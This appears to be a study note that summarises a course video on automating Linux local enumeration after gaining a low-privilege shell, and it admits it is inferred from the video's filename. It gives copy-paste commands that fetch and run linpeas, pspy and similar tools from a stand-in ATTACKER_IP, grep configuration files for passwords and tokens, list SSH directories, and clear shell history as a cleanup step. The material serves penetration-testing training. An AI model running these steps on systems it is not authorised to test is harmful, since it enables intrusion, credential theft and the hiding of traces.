# What the video covers (Introduction / big picture)
Note: No transcript was provided. The following summary is inferred conservatively from the filename “13 - Automating Linux Local Enumeration.mp4” within “01-LinuxLocalEnumeration”.

The video focuses on quickly and consistently enumerating Linux systems after you obtain a low-privilege shell, using automated scripts and a small set of reliable commands. The goal is to accelerate privilege escalation by collecting system, user, service, permissions, and misconfiguration data with minimal manual effort. Typical tools include linpeas, LinEnum, Linux Smart Enumeration (LSE), Linux Exploit Suggester, and process monitors like pspy. The video likely demonstrates transferring these tools to the target, running them safely, capturing outputs, and triaging results to identify escalation paths.

# Flow (ordered)
1. Stabilize your shell (PTY upgrade) and pick a safe working directory (/dev/shm or /tmp).
2. Run quick manual checks (id, whoami, uname, sudo -l) to confirm context and basics.
3. Host enumeration tools on your attacker machine via a simple HTTP server.
4. Transfer and run automated enumeration scripts (linpeas, LinEnum, LSE, LES) on the target.
5. Save outputs (tee) to review offline; look for “high-value” indicators (sudo misconfigs, SUID/SGID, writable paths, credentials).
6. Run a process monitor (pspy) to catch cron/systemd tasks that run as root.
7. Augment with targeted manual checks (SUID, capabilities, cron, services, creds in configs).
8. Use findings with GTFOBins/specific misconfig techniques to attempt privilege escalation.
9. Clean up artifacts and logs if permitted by scope.
10. Document findings and escalation path.

# Tools highlighted
- linpeas (PEASS-ng): Comprehensive Linux privilege escalation enumeration script.
- LinEnum: Classic Linux local enumeration script (thorough system info).
- LSE (Linux Smart Enumeration): Fast-to-thorough levels; categorized results.
- Linux Exploit Suggester (LES): Suggests kernel/local exploits based on kernel version.
- pspy: Monitors processes/crons without root to discover scheduled root tasks.
- Core utilities:
  - find (SUID/SGID/world-writable paths)
  - getcap (file capabilities)
  - sudo -l (sudo permissions)
  - ss/netstat/ip (network and listening services)
  - grep (credential hunting in configs)
- Transfer helpers:
  - python3 -m http.server (attacker)
  - curl/wget (target)

# Typical command walkthrough (detailed, copy-paste friendly)
Attacker: prepare tools and hosting
```bash
# 1) Prepare a working folder and download common enumerators
mkdir -p ~/loot && cd ~/loot

# linpeas
curl -LO https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh

# LinEnum
curl -LO https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh

# LSE (Linux Smart Enumeration)
curl -LO https://raw.githubusercontent.com/diego-treitos/linux-smart-enumeration/master/lse.sh

# LES (Linux Exploit Suggester)
curl -LO https://raw.githubusercontent.com/mzet-/linux-exploit-suggester/master/linux-exploit-suggester.sh

# pspy (process monitor) — if this direct link fails, get the latest “pspy64” from the repo releases
curl -LO https://github.com/DominicBreuker/pspy/releases/latest/download/pspy64

# 2) Start a simple web server to serve the files
python3 -m http.server 8000
# Note your attacker IP (A): ip a | grep -Eo 'inet [0-9.]+'
```

Target: stabilize and enumerate
```bash
# 0) Stabilize shell (if needed); some steps may vary by TTY
python3 -c 'import pty; pty.spawn("/bin/bash")'
export TERM=xterm
# Press Ctrl+Z to background, then on your local: stty raw -echo; fg; reset

# 1) Basic context
whoami; id; hostname; uname -a
cat /etc/os-release 2>/dev/null || lsb_release -a 2>/dev/null
echo "PATH=$PATH"
sudo -l 2>/dev/null

# 2) Choose ephemeral working dir
cd /dev/shm 2>/dev/null || cd /tmp || cd /var/tmp

# 3) Set attacker IP variable (edit this)
export A=ATTACKER_IP

# 4) Fetch tools (use curl or wget depending on availability)
curl -O http://$A:8000/linpeas.sh     2>/dev/null || wget http://$A:8000/linpeas.sh
curl -O http://$A:8000/LinEnum.sh     2>/dev/null || wget http://$A:8000/LinEnum.sh
curl -O http://$A:8000/lse.sh         2>/dev/null || wget http://$A:8000/lse.sh
curl -O http://$A:8000/linux-exploit-suggester.sh 2>/dev/null || wget http://$A:8000/linux-exploit-suggester.sh
curl -O http://$A:8000/pspy64         2>/dev/null || wget http://$A:8000/pspy64

chmod +x linpeas.sh LinEnum.sh lse.sh linux-exploit-suggester.sh pspy64 2>/dev/null

# 5) Run linpeas first and save the output for offline triage
./linpeas.sh | tee linpeas.out

# 6) Optionally run other enumerators
./LinEnum.sh | tee linenum.out
./lse.sh | tee lse.out
./linux-exploit-suggester.sh | tee les.out

# 7) Monitor processes/cron to catch root tasks (let it run for a few minutes)
./pspy64 | tee pspy.out

# 8) Targeted manual checks (fallbacks/augment)
# SUID/SGID binaries
find / -perm -4000 -type f 2>/dev/null | sort | tee suid.out
find / -perm -2000 -type f 2>/dev/null | sort | tee sgid.out

# File capabilities
command -v getcap >/dev/null 2>&1 && getcap -r / 2>/dev/null | tee caps.out

# World-writable directories (exclude kernel pseudo-fs)
find / -type d -writable 2>/dev/null | grep -vE '^/(proc|sys|dev)($|/)' | tee ww_dirs.out

# Cron/systemd timers (some may need root but try)
crontab -l 2>/dev/null
ls -la /etc/cron* 2>/dev/null
cat /etc/crontab 2>/dev/null
systemctl list-timers --all 2>/dev/null

# Networking
ip a 2>/dev/null || ifconfig 2>/dev/null
ip route 2>/dev/null || route -n 2>/dev/null
ss -tulpn 2>/dev/null || netstat -tulpn 2>/dev/null
cat /etc/hosts 2>/dev/null; cat /etc/resolv.conf 2>/dev/null

# Credentials in common places (limit scope to avoid huge noise)
grep -RniE 'password|passwd|secret|token|apikey|db_pass|db_user' /etc /opt /var/www /home 2>/dev/null | head -n 200 | tee cred_hits.out
ls -la /root /home/* 2>/dev/null
ls -la ~/.ssh 2>/dev/null; ls -la /home/*/.ssh 2>/dev/null

# Packages/services
dpkg -l 2>/dev/null | head -n 50
rpm -qa 2>/dev/null | head -n 50
ps auxww | tee ps.out
systemctl list-units --type=service --state=running 2>/dev/null | tee services.out

# Docker/LXC indicators
id; groups
[ -S /var/run/docker.sock ] && echo "[*] Docker socket present: /var/run/docker.sock"
[ -f /.dockerenv ] && echo "[*] Running inside a container"

# 9) After triage, attempt privesc paths (e.g., GTFOBins for SUID/sudo-l)
# Example: if you have (sudo -l) permissions on a command, search it on https://gtfobins.github.io/
```

Cleanup (if allowed and safe)
```bash
rm -f linpeas.sh LinEnum.sh lse.sh linux-exploit-suggester.sh pspy64 \
      linpeas.out linenum.out lse.out les.out pspy.out suid.out sgid.out caps.out ww_dirs.out ps.out services.out cred_hits.out 2>/dev/null
history -c 2>/dev/null
```

# Practical tips
- Prefer /dev/shm for speed and reduced disk artifacts; fall back to /tmp or /var/tmp.
- Always save outputs (tee) to avoid re-running noisy scripts and to review offline.
- If curl/wget is blocked, consider:
  - Serving base64-encoded payloads for copy/paste transfer.
  - Using scp if you have creds.
  - Using a different port on your HTTP server (e.g., 8080, 9001).
- Start with linpeas, then corroborate with LinEnum/LSE; cross-validate hits (sudoers, writable paths, creds).
- Triage priorities:
  - sudo -l results (NOPASSWD, SETENV, !secure_path)
  - SUID/SGID on unusual binaries (use GTFOBins)
  - Writable directories in PATH or service/script paths
  - Cron/systemd timers that call writable scripts
  - Capabilities (e.g., cap_setuid+ep on interpreters)
  - Credentials in app configs (e.g., /var/www, .env, config.php)
  - Membership in docker/lxd/kvm/libvirt groups
- If kernel is outdated, run LES and searchsploit by kernel version, but prefer misconfig over kernel exploits when possible.
- Minimize noise on production-like targets; some searches can be heavy—scope your grep/find paths.
- Document exact commands, file paths, and evidence; it speeds up reporting and exam grading.

# Minimal cheat sheet (one-screen flow)
```bash
# Attacker
cd ~/loot
curl -LO https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh
curl -LO https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh
curl -LO https://raw.githubusercontent.com/diego-treitos/linux-smart-enumeration/master/lse.sh
curl -LO https://raw.githubusercontent.com/mzet-/linux-exploit-suggester/master/linux-exploit-suggester.sh
curl -LO https://github.com/DominicBreuker/pspy/releases/latest/download/pspy64 || true
python3 -m http.server 8000

# Target
python3 -c 'import pty; pty.spawn("/bin/bash")'; export TERM=xterm
export A=ATTACKER_IP; cd /dev/shm 2>/dev/null || cd /tmp
for f in linpeas.sh LinEnum.sh lse.sh linux-exploit-suggester.sh pspy64; do curl -O http://$A:8000/$f 2>/dev/null || wget http://$A:8000/$f; done
chmod +x linpeas.sh LinEnum.sh lse.sh linux-exploit-suggester.sh pspy64 2>/dev/null
./linpeas.sh | tee linpeas.out
sudo -l 2>/dev/null
find / -perm -4000 -type f 2>/dev/null | sort | tee suid.out
command -v getcap >/dev/null 2>&1 && getcap -r / 2>/dev/null | tee caps.out
./pspy64 | tee pspy.out
grep -RniE 'password|secret|token|db_pass|db_user' /etc /opt /var/www /home 2>/dev/null | head -n 200 | tee cred_hits.out
```

# Summary
Automating Linux local enumeration reduces time-to-find for common privilege escalation vectors. The workflow is: stabilize shell, run a trusted enumerator (linpeas) first, confirm with LinEnum/LSE, monitor with pspy, and augment with targeted manual checks (sudo -l, SUID/SGID, capabilities, cron/systemd, writable paths, and credential hunting). Host your tools, transfer via curl/wget, and save outputs for triage. Prioritize misconfigurations and use GTFOBins for exploitation of identified binaries or sudo permissions. Clean up artifacts and document evidence thoroughly.